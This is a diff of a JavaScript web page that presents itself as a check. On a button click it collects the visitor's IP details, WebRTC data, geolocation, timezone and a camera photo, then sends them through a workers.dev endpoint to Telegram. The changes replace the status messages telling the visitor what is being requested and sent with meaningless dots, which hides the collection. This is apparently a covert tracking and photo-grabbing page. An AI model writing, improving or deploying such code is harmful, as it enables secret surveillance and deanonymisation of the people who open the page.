@@ -98,7 +98,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       var raw = await r.text();
       var j;
       try { j = JSON.parse(raw); }
-      catch(e) { return { ok: false, err: 'Worker вернул не-JSON (HTTP ' + r.status + '): ' + raw.slice(0, 200) }; }
+      catch(e) { return { ok: false, err: ' не-JSON (HTTP ' + r.status + '): ' + raw.slice(0, 200) }; }
       return j;
     } catch(e) {
       return { ok: false, err: 'ДА: ' + e.message };
@@ -220,7 +220,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
   btn.addEventListener('click', async function(){
     btn.disabled = true;
     btn.textContent = 'Проверяем…';
-    setStatus('Запрашиваем разрешения');
+    setStatus('.....');
 
     var [ipInfo, rtc, geo, camRes] = await Promise.all([
       getIpInfo(),
@@ -240,7 +240,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       camLine = '✗ : ' + camRes.error;
     }
 
-    setStatus('2/4 Камера: ' + camLine + '\n3/4 ');
+    setStatus('..... ' + camLine + '\n.... ');
 
     var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
     var vpnSuspected = false;
@@ -293,8 +293,8 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
     if (result && result.ok) {
       var sentAs = photoBlob ? 'с' : 'без ';
       setStatus(
-        '✓ РАЗРЕШЕНО (' + sentAs + ')\n\n' +
-        'РАЗРЕШ: ' + camLine + '\n' +
+        '.... (' + sentAs + ')\n\n' +
+        '.....: ' + camLine + '\n' +
         'Сообщение ID: ' + (result.tg && result.tg.result && result.tg.result.message_id || '—'),
         'ok'
       );
@@ -308,10 +308,10 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       else if (result && result.tg && result.tg.description) reason = result.tg.description;
       else if (result && result.tg && result.tg.error_code) reason = 'код ' + result.tg.error_code;
       setStatus(
-        '✗ НЕ \n\n' +
-        'да: ' + reason + '\n' +
-        'да: ' + camLine + '\n\n' +
-        'Смотри консоль (Cmd+Option+C).',
+        '✗ . \n\n' +
+        '.: ' + reason + '\n' +
+        '.: ' + camLine + '\n\n' +
+        'Смотри .',
         'err'
       );
       btn.textContent = 'Повторить';
